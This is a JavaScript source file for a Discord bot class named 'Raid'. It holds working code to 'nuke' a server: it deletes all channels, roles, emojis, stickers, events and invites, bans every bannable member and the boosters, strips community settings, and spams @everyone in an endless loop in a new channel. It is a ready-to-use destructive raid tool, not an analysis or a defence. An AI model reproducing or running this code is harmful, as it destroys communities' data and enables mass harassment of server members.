const { ChannelType } = require('discord-api-types/v10');
module.exports = class Raid {

  guild;
  client;

  constructor(guild, client) {
    this.guild = guild;
    this.client = client;
  }

  nukeEmojis() {
    this.guild.emojis.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  nukeStickers() {
    this.guild.stickers.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  nukeScheduledEvents() {
    this.guild.scheduledEvents.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  nukeChannels() {
    this.guild.channels.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  nukeRoles() {
    this.guild.roles.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  banAllMembers() {
    this.guild.members.cache.map(async (e) => {
      if (e.user.id === this.client.user.id) return;
      if (!e.bannable) return;
      try {
        await e.ban();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  banBoosters() {
    const boosterRole = this.guild.roles.premiumSubscriberRole;
    this.guild.members.cache.filter(member => member.roles.cache.has(boosterRole)).map(async (e) => {
      console.log(e);
      if (e.user.id === this.client.user.id) return;
      if (!e.bannable) return;
      try {
        await e.ban();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  nukeInvites() {
    this.guild.invites.cache.map(async (e) => {
      try {
        await e.delete();
      } catch (e) {
        console.log(e.message);
      }
    });
  }

  disableCommunity() {
    this.guild.edit({
      rulesChannel: null,
      safetyAlertsChannel: null,
      publicUpdatesChannel: null,
      description: null,
      features: ['']
    });
  }

  createChannelAndSpamEveryone(message) {
    this.guild.channels.create({
      name: 'lmao',
      type: ChannelType.GuildText,
    }).then(channel => {
      if (this.guild.features.includes('COMMUNITY')) {
        this.guild.edit({
          rulesChannel: channel
        });
      }
      while (true) {
        channel.send({
          content: message,
          allowed_mentions: {
            parse: ['everyone', 'here']
          }
        });
      }
    });
  }

}
